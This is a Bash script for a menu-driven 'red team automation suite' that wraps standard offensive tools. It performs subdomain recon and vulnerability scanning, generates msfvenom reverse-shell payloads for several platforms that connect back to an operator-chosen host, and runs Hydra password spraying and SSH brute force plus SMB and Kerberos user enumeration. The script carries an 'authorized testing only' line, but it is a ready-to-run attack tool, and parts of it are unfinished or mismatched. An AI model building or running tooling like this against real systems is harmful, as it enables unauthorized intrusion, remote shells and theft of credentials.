#!/bin/bash
# RedOps-Automator v2.0
# Enhanced Red Team Automation Suite
# Author: anon 

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
NC='\033[0m' # No Color

# Global Variables
TARGET=""
CURRENT_DIR=$(pwd)
TOOLS_DIR="$HOME/redops-tools"
LOG_FILE="redops_$(date +%Y%m%d_%H%M%S).log"
ERRORS=0

# Logging and error tracking
function log() {
    echo -e "$(date '+%Y-%m-%d %H:%M:%S') - $1" | tee -a "$LOG_FILE"
}

function error() {
    echo -e "${RED}[!] $1${NC}" | tee -a "$LOG_FILE"
    ERRORS=$((ERRORS+1))
}

function banner() {
    clear
    echo -e "${PURPLE}"
    echo " ██████╗ ███████╗██████╗  ██████╗  ██████╗ ██████╗ ███████╗"
    echo "██╔═══██╗██╔════╝██╔══██╗██╔═══██╗██╔════╝ ██╔══██╗██╔════╝"
    echo "██║   ██║█████╗  ██║  ██║██║   ██║██║  ███╗██████╔╝███████╗"
    echo "██║   ██║██╔══╝  ██║  ██║██║   ██║██║   ██║██╔═══╝ ╚════██║"
    echo "╚██████╔╝██║     ██████╔╝╚██████╔╝╚██████╔╝██║     ███████║"
    echo " ╚═════╝ ╚═╝     ╚═════╝  ╚═════╝  ╚═════╝ ╚═╝     ╚══════╝"
    echo -e "${NC}"
    echo -e "${BLUE}Red Team Automation Suite v2.0${NC}"
    echo -e "${YELLOW}Designed for authorized penetration testing only${NC}\n"
}

function check_tools() {
    required_tools=("subfinder" "amass" "httpx" "nmap" "whatweb" "nuclei" "jaeles" "msfvenom" "searchsploit" "enum4linux" "hydra" "wafw00f" "nikto" "zip" "awk" "find" "unzip")
    missing_tools=()
    for tool in "${required_tools[@]}"; do
        if ! command -v "$tool" &> /dev/null; then
            missing_tools+=("$tool")
        fi
    done
    if [ ${#missing_tools[@]} -gt 0 ]; then
        error "Missing tools detected: ${missing_tools[*]}"
        echo -e "\n${YELLOW}[*] Would you like to install missing tools? [y/N]${NC}"
        read -r answer
        if [[ "$answer" =~ ^[Yy]$ ]]; then
            install_tools "${missing_tools[@]}"
        else
            error "Some features may not work without these tools"
            sleep 2
        fi
    fi
}

function install_tools() {
    echo -e "${GREEN}[*] Installing missing tools...${NC}"
    mkdir -p "$TOOLS_DIR"
    
    # Check for package manager
    if command -v apt &> /dev/null; then
        PM="apt"
    elif command -v yum &> /dev/null; then
        PM="yum"
    elif command -v brew &> /dev/null; then
        PM="brew"
    else
        echo -e "${RED}[!] Could not detect package manager${NC}"
        return 1
    fi
    
    # Install basic dependencies
    sudo $PM update -y
    sudo $PM install -y git curl wget python3 python3-pip golang
    
    # Install Go if not present
    if ! command -v go &> /dev/null; then
        echo -e "${YELLOW}[*] Installing Go...${NC}"
        wget https://golang.org/dl/go1.20.linux-amd64.tar.gz
        sudo tar -C /usr/local -xzf go1.20.linux-amd64.tar.gz
        echo 'export PATH=$PATH:/usr/local/go/bin' >> ~/.bashrc
        source ~/.bashrc
        rm go1.20.linux-amd64.tar.gz
    fi
    
    # Install tools
    for tool in "$@"; do
        case "$tool" in
            "subfinder")
                echo -e "${YELLOW}[*] Installing subfinder...${NC}"
                GO111MODULE=on go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
                sudo cp ~/go/bin/subfinder /usr/local/bin/
                ;;
            "amass")
                echo -e "${YELLOW}[*] Installing amass...${NC}"
                GO111MODULE=on go install -v github.com/OWASP/Amass/v3/...@master
                sudo cp ~/go/bin/amass /usr/local/bin/
                ;;
            "httpx")
                echo -e "${YELLOW}[*] Installing httpx...${NC}"
                GO111MODULE=on go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest
                sudo cp ~/go/bin/httpx /usr/local/bin/
                ;;
            "nuclei")
                echo -e "${YELLOW}[*] Installing nuclei...${NC}"
                GO111MODULE=on go install -v github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest
                sudo cp ~/go/bin/nuclei /usr/local/bin/
                nuclei -update-templates
                ;;
            "jaeles")
                echo -e "${YELLOW}[*] Installing jaeles...${NC}"
                GO111MODULE=on go install -v github.com/jaeles-project/jaeles@latest
                sudo cp ~/go/bin/jaeles /usr/local/bin/
                ;;
            "msfvenom")
                echo -e "${YELLOW}[*] Installing Metasploit...${NC}"
                curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
                chmod +x msfinstall
                ./msfinstall
                rm msfinstall
                ;;
            "searchsploit")
                echo -e "${YELLOW}[*] Installing ExploitDB...${NC}"
                git clone https://github.com/offensive-security/exploitdb.git "$TOOLS_DIR/exploitdb"
                sudo ln -sf "$TOOLS_DIR/exploitdb/searchsploit" /usr/local/bin/searchsploit
                ;;
            *)
                echo -e "${RED}[!] Unknown tool: $tool${NC}"
                ;;
        esac
    done
    
    echo -e "${GREEN}[*] Tool installation complete${NC}"
}

function initial_recon() {
    echo -e "${GREEN}[*] Starting Initial Recon...${NC}"
    read -p "Enter target domain: " TARGET
    
    if [ -z "$TARGET" ]; then
        error "Target cannot be empty"
        return
    fi
    
    mkdir -p recon/"$TARGET" && cd recon/"$TARGET" || exit
    
    echo -e "${CYAN}[*] Running subfinder...${NC}"
    if ! subfinder -d "$TARGET" -silent -o subfinder.txt; then
        error "Subfinder failed for $TARGET"
    else
        log "Subfinder completed for $TARGET"
    fi

    echo -e "${CYAN}[*] Running amass...${NC}"
    if ! amass enum -passive -d "$TARGET" -o amass.txt; then
        error "Amass failed for $TARGET"
    else
        log "Amass completed for $TARGET"
    fi
    
    echo -e "${CYAN}[*] Combining and sorting subdomains...${NC}"
    cat subfinder.txt amass.txt | sort -u > all_subs.txt
    log "Combined subdomains into all_subs.txt"
    
    echo -e "${CYAN}[*] Checking live hosts with httpx...${NC}"
    if ! httpx -l all_subs.txt -silent -status-code -title -tech-detect -o httpx_results.txt; then
        error "HTTPX scan failed"
    else
        log "HTTPX scan completed"
    fi
    
    echo -e "${CYAN}[*] Running whatweb...${NC}"
    if ! whatweb -i httpx_results.txt -v > whatweb.txt; then
        error "WhatWeb scan failed"
    else
        log "WhatWeb scan completed"
    fi
    
    echo -e "${CYAN}[*] Running nmap...${NC}"
    if ! nmap -iL httpx_results.txt -sV -T4 -oN nmap_scan.txt; then
        error "Nmap scan failed"
    else
        log "Nmap scan completed"
    fi
    
    echo -e "${CYAN}[*] Taking screenshots with aquatone...${NC}"
    if ! command -v aquatone &> /dev/null; then
        echo -e "${YELLOW}[*] Installing aquatone...${NC}"
        wget https://github.com/michenriksen/aquatone/releases/download/v1.7.0/aquatone_linux_amd64_1.7.0.zip -O aquatone.zip
        unzip aquatone.zip -d "$TOOLS_DIR/aquatone"
        sudo ln -s "$TOOLS_DIR/aquatone/aquatone" /usr/local/bin/aquatone
        rm aquatone.zip
    fi
    if ! aquatone -input-file httpx_results.txt -out aquatone_report -scan-timeout 1000; then
        error "Aquatone screenshots failed"
    else
        log "Aquatone screenshots completed"
    fi
    
    echo -e "${YELLOW}[+] Recon Complete. Output in recon/$TARGET${NC}"
    cd "$CURRENT_DIR" || exit
    menu
}

function vuln_scan() {
    echo -e "${GREEN}[*] Running Vulnerability Scans...${NC}"
    
    if [ -z "$TARGET" ]; then
        read -p "Enter path to file with targets (default: recon/*/httpx_results.txt): " target_file
        target_file=${target_file:-$(find recon -name "httpx_results.txt" | head -1)}
    else
        target_file="recon/$TARGET/httpx_results.txt"
    fi
    
    if [ ! -f "$target_file" ]; then
        error "Target file not found. Run recon first."
        menu
        return
    fi
    
    echo -e "${CYAN}[*] Running nuclei...${NC}"
    if ! nuclei -l "$target_file" -t cves/ -severity medium,high,critical -o nuclei_results.txt; then
        error "Nuclei scan failed"
    else
        log "Nuclei scan completed"
    fi
    
    echo -e "${CYAN}[*] Running jaeles...${NC}"
    if ! jaeles scan -U "$target_file" -s /usr/local/jaeles-signatures/ -o jaeles_results.txt; then
        error "Jaeles scan failed"
    else
        log "Jaeles scan completed"
    fi
    
    echo -e "${CYAN}[*] Checking WAFs...${NC}"
    if ! wafw00f -i "$target_file" -o waf_results.txt; then
        error "WAF detection failed"
    else
        log "WAF detection completed"
    fi
    
    echo -e "${CYAN}[*] Running nikto...${NC}"
    mkdir -p nikto_scans
    while IFS= read -r url; do
        domain=$(echo "$url" | awk -F/ '{print $3}')
        if ! nikto -h "$url" -output "nikto_scans/nikto_$domain.txt"; then
            error "Nikto scan failed for $url"
        fi
    done < "$target_file"
    log "Nikto scans completed"
    
    echo -e "${YELLOW}[+] Vulnerability Scan Complete.${NC}"
    menu
}

function initial_access() {
    echo -e "${GREEN}[*] Initial Access Tools...${NC}"
    echo -e "${CYAN}1. Generate Reverse Shell Payload"
    echo -e "2. Phishing Campaign Setup"
    echo -e "3. Search for Exploits"
    echo -e "4. Password Spraying"
    echo -e "0. Back to Main Menu${NC}"
    echo -n "Choice: "
    read -r choice
    
    case $choice in
        1)
            echo -e "${CYAN}[*] Payload Generator${NC}"
            read -p "Enter LHOST: " lhost
            read -p "Enter LPORT (default: 4444): " lport
            lport=${lport:-4444}
            
            echo -e "${YELLOW}Select payload type:"
            echo -e "1. Linux (x64)"
            echo -e "2. Windows (x64)"
            echo -e "3. Windows (x86)"
            echo -e "4. Android"
            echo -e "5. macOS${NC}"
            read -p "Choice: " payload_type
            
            case $payload_type in
                1)
                    msfvenom -p linux/x64/shell_reverse_tcp LHOST="$lhost" LPORT="$lport" -f elf > shell.elf
                    echo -e "${GREEN}[+] Linux payload generated: shell.elf${NC}"
                    ;;
                2)
                    msfvenom -p windows/x64/shell_reverse_tcp LHOST="$lhost" LPORT="$lport" -f exe > shell.exe
                    echo -e "${GREEN}[+] Windows x64 payload generated: shell.exe${NC}"
                    ;;
                3)
                    msfvenom -p windows/shell_reverse_tcp LHOST="$lhost" LPORT="$lport" -f exe > shell_x86.exe
                    echo -e "${GREEN}[+] Windows x86 payload generated: shell_x86.exe${NC}"
                    ;;
                4)
                    msfvenom -p android/meterpreter/reverse_tcp LHOST="$lhost" LPORT="$lport" -o android.apk
                    echo -e "${GREEN}[+] Android payload generated: android.apk${NC}"
                    ;;
                5)
                    msfvenom -p osx/x64/shell_reverse_tcp LHOST="$lhost" LPORT="$lport" -f macho > shell.macho
                    echo -e "${GREEN}[+] macOS payload generated: shell.macho${NC}"
                    ;;
                *)
                    echo -e "${RED}[!] Invalid choice${NC}"
                    ;;
            esac
            ;;
        2)
            echo -e "${YELLOW}[*] For phishing campaigns, consider:"
            echo -e " - Gophish (https://getgophish.com)"
            echo -e " - SET (Social Engineering Toolkit)"
            echo -e " - King Phisher${NC}"
            ;;
        3)
            echo -e "${CYAN}[*] Updating and searching ExploitDB...${NC}"
            searchsploit --update
            read -p "Enter search term (e.g., 'Apache 2.4'): " search_term
            searchsploit "$search_term"
            ;;
        4)
            echo -e "${YELLOW}[!] This is a dangerous operation. Use responsibly.${NC}"
            read -p "Enter user list file: " user_file
            read -p "Enter password list file: " pass_file
            read -p "Enter target URL/IP: " target
            echo -e "${CYAN}[*] Running password spray...${NC}"
            hydra -L "$user_file" -P "$pass_file" "$target" http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -t 4 -w 30
            ;;
        0)
            menu
            ;;
        *)
            echo -e "${RED}[!] Invalid choice${NC}"
            ;;
    esac
    
    menu
}

# ... [rest of the functions remain similar but can be enhanced similarly]


# Additional modules
function lateral_movement() {
    echo -e "${GREEN}[*] Lateral Movement Tools...${NC}"
    echo -e "${CYAN}1. SMB Enumeration"
    echo -e "2. SSH Brute Force"
    echo -e "3. Kerberos Enumeration"
    echo -e "0. Back to Main Menu${NC}"
    echo -n "Choice: "
    read -r choice
    case $choice in
        1)
            read -p "Enter target IP: " target_ip
            enum4linux -a "$target_ip" | tee smb_enum.txt
            log "SMB enumeration completed for $target_ip"
            ;;
        2)
            read -p "Enter target IP: " target_ip
            read -p "Enter user list file: " user_file
            read -p "Enter password list file: " pass_file
            hydra -L "$user_file" -P "$pass_file" ssh://$target_ip -t 4 -w 30 | tee ssh_brute.txt
            log "SSH brute force completed for $target_ip"
            ;;
        3)
            read -p "Enter domain: " domain
            nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm="$domain" "$domain" | tee kerberos_enum.txt
            log "Kerberos enumeration completed for $domain"
            ;;
        0)
            menu
            ;;
        *)
            echo -e "${RED}[!] Invalid choice${NC}"
            ;;
    esac
    menu
}

function reporting() {
    echo -e "${GREEN}[*] Generating Final Report...${NC}"
    report_dir="report_$(date +%Y%m%d_%H%M%S)"
    mkdir -p "$report_dir"
    cp -r recon "$report_dir/" 2>/dev/null
    cp -r nikto_scans "$report_dir/" 2>/dev/null
    cp nuclei_results.txt jaeles_results.txt waf_results.txt "$report_dir/" 2>/dev/null
    echo -e "${CYAN}[*] Zipping report...${NC}"
    if ! zip -r "$report_dir.zip" "$report_dir" >/dev/null; then
        error "Failed to zip report directory."
    fi
    if [ -f "$report_dir.zip" ]; then
        echo -e "${YELLOW}[+] Report generated: $report_dir.zip${NC}"
        log "Report generated: $report_dir.zip"
    fi
    menu
}

function finish() {
    echo -e "${GREEN}[*] Cleaning up and finishing session...${NC}"
    echo -e "${CYAN}[*] Stopping background jobs...${NC}"
    jobs -p | xargs -r kill 2>/dev/null
    echo -e "${CYAN}[*] Removing temporary files...${NC}"
    rm -rf /tmp/redops-* 2>/dev/null
    if [ $ERRORS -gt 0 ]; then
        echo -e "${RED}[!] $ERRORS errors occurred during this session. See $LOG_FILE for details.${NC}"
    fi
    echo -e "${YELLOW}[+] Session finished. Logs saved to $LOG_FILE${NC}"
    exit 0
}

# Enhanced menu
function menu() {
    echo -e "${BLUE}\nRedOps Main Menu${NC}"
    echo -e "${CYAN}1. Initial Recon"
    echo -e "2. Vulnerability Scan"
    echo -e "3. Initial Access"
    echo -e "4. Lateral Movement"
    echo -e "5. Reporting"
    echo -e "6. Finish & Cleanup"
    echo -e "0. Exit${NC}"
    echo -n "Choice: "
    read -r choice
    case $choice in
        1)
            initial_recon
            ;;
        2)
            vuln_scan
            ;;
        3)
            initial_access
            ;;
        4)
            lateral_movement
            ;;
        5)
            reporting
            ;;
        6)
            finish
            ;;
        0)
            finish
            ;;
        *)
            echo -e "${RED}[!] Invalid choice${NC}"
            menu
            ;;
    esac
}

# Main execution
banner
check_tools
menu
